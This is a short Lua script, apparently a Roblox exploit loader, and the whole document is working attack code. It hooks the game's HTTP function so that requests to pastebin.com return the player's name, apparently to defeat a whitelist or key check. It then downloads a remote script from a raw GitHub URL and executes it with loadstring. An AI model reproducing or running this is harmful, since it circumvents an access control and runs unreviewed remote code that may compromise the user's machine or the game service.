local old
old = hookfunction(game.HttpGetAsync, function(self, url)
    if type(url) == "string" then
        if string.match(url, "^https://pastebin%.com") then
            return game.Players.LocalPlayer.Name
        end
    end
    return old(self, url)
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/vxyo/Loaders/refs/heads/main/LUARMORK.lua"))()
